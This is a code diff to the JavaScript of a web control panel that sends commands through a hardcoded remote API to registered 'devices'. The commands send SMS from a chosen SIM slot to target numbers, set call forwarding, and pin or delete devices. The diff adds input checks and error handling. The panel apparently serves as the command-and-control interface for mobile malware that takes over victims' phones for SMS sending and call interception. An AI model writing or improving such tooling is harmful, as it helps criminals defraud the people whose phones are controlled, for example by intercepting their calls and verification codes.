@@ -179,39 +179,87 @@
 
         async function act(id, type) {
             let data = {};
+            
             if(type === 'SEND_SMS') {
-                const n = prompt("Phone Number:");
-                const m = prompt("Message:");
-                if(!n || !m) return;
-                data = { number: n, message: m };
-            }
-            if(type === 'CALL_FORWARD') {
-                const n = prompt("Forward to Number:");
-                if(!n) return;
+                // Prompt for SIM slot selection
+                const simSlot = prompt("Select SIM slot (1 or 2):", "1");
+                if (!simSlot || (simSlot !== '1' && simSlot !== '2')) {
+                    toast('❌ Invalid SIM slot', true);
+                    return;
+                }
+                
+                // Prompt for target number
+                const number = prompt("Enter target phone number:", "");
+                if (!number) {
+                    toast('❌ Phone number required', true);
+                    return;
+                }
+                
+                // Prompt for message
+                const message = prompt("Enter SMS message:", "");
+                if (!message) {
+                    toast('❌ Message required', true);
+                    return;
+                }
+                
+                data = { simSlot, number, message };
+                
+            } else if(type === 'CALL_FORWARD') {
+                const n = prompt("Enter number for call forwarding:", "");
+                if(!n) {
+                    toast('❌ Phone number required', true);
+                    return;
+                }
                 data = { number: n };
             }
 
-            const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/command', {
-                method:'POST', headers:{'Content-Type':'application/json'},
-                body: JSON.stringify({deviceId: id, action: type, data: data})
-            });
-            const d = await r.json();
-            toast(d.message, !d.success);
+            try {
+                const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/command', {
+                    method:'POST', headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({deviceId: id, action: type, data: data})
+                });
+                const d = await r.json();
+                toast(d.message, !d.success);
+            } catch (err) {
+                toast('❌ Error: ' + err.message, true);
+            }
         }
 
         async function togglePin(id, s) {
-            await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/pin-device', {
-                method:'POST', headers:{'Content-Type':'application/json'},
-                body: JSON.stringify({deviceId: id, status: s})
-            });
+            try {
+                const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/pin-device', {
+                    method:'POST', headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({deviceId: id, status: s})
+                });
+                const d = await r.json();
+                if (d.success) {
+                    fetchData(false);
+                    toast(d.message, false);
+                } else {
+                    toast(d.message, true);
+                }
+            } catch (err) {
+                toast('❌ Error: ' + err.message, true);
+            }
         }
         
         async function del(id) {
-            if(confirm("Delete Device?")) {
-                await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/delete-device', {
-                    method:'POST', headers:{'Content-Type':'application/json'},
-                    body: JSON.stringify({deviceId: id})
-                });
+            if(confirm("Are you sure you want to delete this device?")) {
+                try {
+                    const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/delete-device', {
+                        method:'POST', headers:{'Content-Type':'application/json'},
+                        body: JSON.stringify({deviceId: id})
+                    });
+                    const d = await r.json();
+                    if (d.success) {
+                        fetchData(false);
+                        toast('✅ Device deleted successfully', false);
+                    } else {
+                        toast(d.message, true);
+                    }
+                } catch (err) {
+                    toast('❌ Error: ' + err.message, true);
+                }
             }
         }
 
